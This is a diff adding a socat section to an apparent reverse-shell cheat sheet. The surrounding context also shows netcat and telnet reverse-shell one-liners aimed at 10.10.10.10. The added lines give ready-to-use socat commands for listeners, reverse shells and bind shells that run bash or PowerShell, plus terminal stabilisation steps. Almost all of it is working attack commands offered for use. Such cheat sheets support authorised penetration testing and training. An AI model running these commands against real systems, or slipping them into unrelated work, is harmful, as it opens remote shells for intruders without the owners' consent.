@@ -12,6 +12,46 @@ Netcat with -e
 nc -e /bin/sh 10.10.10.10 1234
 ```
 
+
+## Socat
+Start a listener:
+```bash
+socat TCP-L:<PORT> -                                 # connect regardless with '-'
+socat -d -d TCP-LISTEN:8080 STDOUT                   # -d -d = increase verbosity of output#
+socat TCP4-LISTEN:8080,fork file:filename.txt,create 
+# create specifies that a new file will be created.
+# fork creates a child process once connection is made to the listener(multiple connections allowed)
+```
+
+Connect to reverse Shell:
+```bash
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+```
+
+For Bind Shells start a bind listener
+```bash
+socat TCP-L:<PORT> EXEC:"bash -li"
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```
+Connect to target regardless:
+```bash
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
+
+Shell stablisation
+```bash
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+[CTRL+Z]
+stty raw -echo; fg 
+```
+
+Fixing terminal size
+```bash
+stty size
+stty -rows 48 -columns 120
+```
+
 ## Telnet
 ```bash
 TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.10 9001 0<$TF | /bin/sh 1>$TF
